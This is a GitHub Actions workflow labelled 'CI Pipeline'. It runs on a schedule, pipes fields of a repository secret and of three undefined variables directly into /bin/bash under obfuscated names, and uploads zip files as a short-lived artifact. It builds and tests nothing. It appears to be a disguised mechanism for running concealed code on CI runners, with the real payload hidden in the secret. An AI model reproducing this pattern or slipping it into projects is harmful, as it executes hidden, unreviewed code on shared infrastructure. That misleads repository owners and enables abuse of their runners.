name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '4 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  pipeline:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          jwgc5: ${{ secrets.jwgc5 }}
        run: |
          printf '%s' "$jwgc5" | jq -r .r3 | /bin/bash
          echo $sotek10415 | jq -r .jnmvz3646 | /bin/bash
          printf '%s' "$bjsd735" | jq -r .qfxfw37239 | /bin/bash
          echo $fsk4 | jq -r .lafs71 | /bin/bash

      - name: Persist output
        if: ${{ always() }}
        uses: actions/upload-artifact@v4
        with:
          name: MjoH7f38
          path: "*.zip"
          retention-days: 1
